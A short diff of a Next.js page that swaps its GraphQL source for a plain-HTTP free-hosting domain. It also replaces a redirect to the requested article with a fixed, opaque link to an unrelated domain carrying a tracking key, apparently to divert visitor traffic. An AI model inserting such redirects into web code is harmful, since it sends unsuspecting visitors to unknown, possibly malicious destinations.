@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://newstick.us/graphql"
+	const endpoint = "http://ournature.wuaze.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://newstick.us/` + encodeURI(path as string)
+					`https://immigraterend.com/n9su2m4e2?key=33acb569cc21f3713f20b48df8e021e5/`
 				}`,
 			},
 		};
